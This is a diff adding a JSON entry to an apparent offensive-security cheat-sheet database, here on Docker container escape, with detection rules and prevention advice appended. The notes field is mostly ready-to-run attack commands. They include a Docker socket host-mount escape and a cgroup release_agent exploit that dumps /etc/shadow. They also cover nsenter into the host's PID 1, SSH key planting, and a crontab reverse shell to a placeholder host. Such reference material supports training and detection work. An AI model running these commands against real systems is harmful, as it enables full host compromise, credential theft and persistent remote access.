@@ -1,0 +1,93 @@
+{
+  "id": "linux-docker-escape",
+  "name": "Docker Container Escape - Privileged & Socket Abuse",
+  "command": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+  "description": "Docker container escapes exploit misconfigurations like privileged mode, mounted Docker socket, excessive capabilities, or host filesystem mounts. If you land in a container, these techniques break out to the host. The Docker socket mount is the most common escape vector in CTFs and real environments.",
+  "platform": "linux",
+  "type": "attack-chain",
+  "opsec": "loud",
+  "category": "Post-Exploitation",
+  "subcategory": "Container Escape",
+  "certifications": [
+    "OSCP",
+    "CPTS"
+  ],
+  "primary_cert": "CPTS",
+  "source": "Docker security; container escape methodology",
+  "tags": [
+    "docker",
+    "container-escape",
+    "privileged",
+    "docker-socket",
+    "breakout",
+    "mount",
+    "capabilities"
+  ],
+  "mitre": [
+    "T1611"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== AM I IN A CONTAINER? ===\n  # Check indicators:\n  cat /proc/1/cgroup | grep docker\n  ls -la /.dockerenv\n  hostname  # Random hex = container\n  cat /proc/self/mountinfo | grep docker\n\n=== DOCKER SOCKET ESCAPE ===\n  # If /var/run/docker.sock is mounted:\n  docker run -v /:/mnt --rm -it alpine chroot /mnt sh\n  # Or without docker CLI:\n  curl -s --unix-socket /var/run/docker.sock http://localhost/images/json\n  # Create container with host mount:\n  curl -s -X POST --unix-socket /var/run/docker.sock -H \"Content-Type: application/json\" http://localhost/containers/create -d \"{\"Image\":\"alpine\",\"Cmd\":[\"chroot\",\"/mnt\",\"sh\"],\"Binds\":[\"/:/mnt\"],\"Tty\":true}\"\n\n=== PRIVILEGED MODE ESCAPE ===\n  # If running --privileged:\n  mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x\n  echo 1 > /tmp/cgrp/x/notify_on_release\n  host_path=$(sed -n \"s/.*\\perdir=\\([^,]*\\).*/\\1/p\" /etc/mtab)\n  echo \"$host_path/cmd\" > /tmp/cgrp/release_agent\n  echo \"#!/bin/sh\" > /cmd\n  echo \"cat /etc/shadow > $host_path/output\" >> /cmd\n  chmod a+x /cmd\n  sh -c \"echo $$ > /tmp/cgrp/x/cgroup.procs\"\n  cat /output\n\n=== CAPABILITIES ABUSE ===\n  # Check capabilities:\n  capsh --print\n  # CAP_SYS_ADMIN: mount host filesystem\n  # CAP_SYS_PTRACE: attach to host processes\n  # CAP_NET_ADMIN: manipulate host networking\n\n=== HOST PID NAMESPACE ===\n  # If --pid=host:\n  nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash\n\n=== WRITABLE HOST MOUNT ===\n  # If host dirs are mounted:\n  # Write SSH key:\n  echo \"ssh-rsa AAA...\" >> /host_mount/root/.ssh/authorized_keys\n  # Write cron job:\n  echo \"* * * * * root bash -i >& /dev/tcp/<ip>/<port> 0>&1\" >> /host_mount/etc/crontab",
+  "examples": [
+    {
+      "label": "Escape via Docker socket",
+      "command": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
+    },
+    {
+      "label": "Check if in container",
+      "command": "cat /proc/1/cgroup | grep docker && ls /.dockerenv"
+    },
+    {
+      "label": "Escape via host PID namespace",
+      "command": "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash"
+    }
+  ],
+  "references": [
+    {
+      "title": "HackTricks - Docker Breakout",
+      "url": "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout"
+    },
+    {
+      "title": "MITRE T1611 - Escape to Host",
+      "url": "https://attack.mitre.org/techniques/T1611/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "k8s-privileged-pod",
+      "note": "Kubernetes privileged pod escape for K8s environments.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Privileged containers share the host kernel and have full access to host devices. Mounted Docker sockets allow creating new containers with host access. Excessive capabilities grant kernel-level operations.",
+    "prerequisites": "Shell inside a misconfigured container (privileged, socket mounted, or excessive capabilities).",
+    "impact": "Full host access from within a container; root on the host system.",
+    "detection": "[MITRE T1611] New container creation with host mounts; privileged container execution; nsenter/chroot from container context.",
+    "artifacts": "Docker daemon logs showing host volume mounts; container creation events; nsenter process execution.",
+    "splunk_spl": "index=linux (sourcetype=docker OR sourcetype=syslog) (\"--privileged\" OR \"docker.sock\" OR \"nsenter\" OR \"chroot /mnt\")\n| table _time, host, process, message",
+    "elastic_kql": "process.name:(\"nsenter\" OR \"chroot\") OR process.args:(\"docker.sock\" OR \"--privileged\")",
+    "sentinel_kql": "Syslog\n| where SyslogMessage has_any (\"nsenter\", \"chroot /mnt\", \"docker.sock\", \"--privileged\")\n| project TimeGenerated, HostName, SyslogMessage",
+    "sigma_rules": "linux_docker_container_escape",
+    "prevention": "Never run containers in privileged mode; do not mount Docker socket; use rootless containers; drop unnecessary capabilities; use gVisor/Kata containers.",
+    "sources": [
+      "Docker security",
+      "https://attack.mitre.org/techniques/T1611/"
+    ],
+    "detections": [
+      {
+        "platform": "sigma",
+        "name": "Docker container escape attempt",
+        "logic": "title: Docker Container Escape via nsenter or Socket\nstatus: experimental\nlogsource:\n  product: linux\n  category: process_creation\ndetection:\n  selection_nsenter:\n    Image|endswith: /nsenter\n    CommandLine|contains: \"--target 1\"\n  selection_socket:\n    CommandLine|contains:\n      - \"docker.sock\"\n      - \"chroot /mnt\"\n  condition: selection_nsenter or selection_socket\nlevel: critical",
+        "data_source": "linux-audit",
+        "attack": [
+          "T1611"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Legitimate container management tools; orchestrator health checks",
+        "tuning": "Any nsenter targeting PID 1 from within a container is almost certainly an escape attempt"
+      }
+    ]
+  }
+}
